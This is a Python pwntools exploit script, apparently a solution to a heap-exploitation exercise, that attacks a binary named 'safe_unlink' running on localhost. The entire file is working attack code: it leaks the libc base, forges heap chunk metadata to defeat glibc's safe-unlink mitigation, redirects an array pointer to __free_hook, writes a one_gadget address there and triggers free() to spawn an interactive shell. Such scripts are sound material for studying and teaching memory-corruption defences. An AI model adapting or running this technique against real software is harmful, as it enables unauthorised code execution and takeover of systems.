#!/usr/bin/env python2.7


from pwn import *

BINARY = './safe_unlink'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0
# one_gadget offset
ONE_GADGET_OFFSET = 0xe1fa1


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def edit(io, index, data):
    io.send("2")
    io.sendafter("index: ", str(index))
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def free(io, index):
    io.send("3")
    io.sendafter("index: ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()
    io.timeout = 0.1

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    one_gadget = libc.address + ONE_GADGET_OFFSET
    log.info("one_gadget found at: " + hex(one_gadget))
    io.recvuntil("> ")

    """
    Request 2 small chunks. A heap overflow exists that allows us to overwrite
    the heap metadata of the chunk below the first chunk, "overflow". We
    overwrite the "victim" chunk's heap metadata to mark the "overflow" chunk
    as freed. When we free the "victim" chunk, the "overflow" chunk is
    consolidated, allowing us to conducted a reflective write. We overwrite the
    __free_hook with the address of our shellcode.
    """
    overflow = malloc(io, 0x88)
    victim = malloc(io, 0x88)

    """
    Prep corrupted chunk metadata. A pointer to our chunk exists in the .data
    section. We will re-use the pointer to fool the safe unlink mitigation.
    """
    fd = elf.sym.m_array - 0x18
    bk = elf.sym.m_array - 0x10

    # Set the prev_size field of the next chunk to the actual previous chunk
    # size.
    prev_size = 0x80
    fake_size = 0x90

    """
    Write the fake chunk metadata to the "overflow" chunk. Overflow into the
    succeeding chunk's size field to clear the prev_inuse flag.
    """
    payload = [
        0,
        prev_size,
        fd,
        bk,
        cyclic(cyclic_find(0x616161616161616d, n=8), n=8),
        prev_size,
        fake_size
    ]
    edit(io, overflow, flat(payload))

    # Free the "victim" chunk to trigger malloc's backward consolidation.
    free(io, victim)

    # Overwrite m_array entry to point to __free_hook.
    payload = [
        0,
        0,
        0,
        libc.sym.__free_hook
    ]
    edit(io, overflow, flat(payload))

    # Overwrite __free_hook with one_gadget
    edit(io, overflow, flat(one_gadget))

    # Call free to execute one_gadget
    free(io, overflow)
    io.interactive()


if __name__ == "__main__":
    solve()
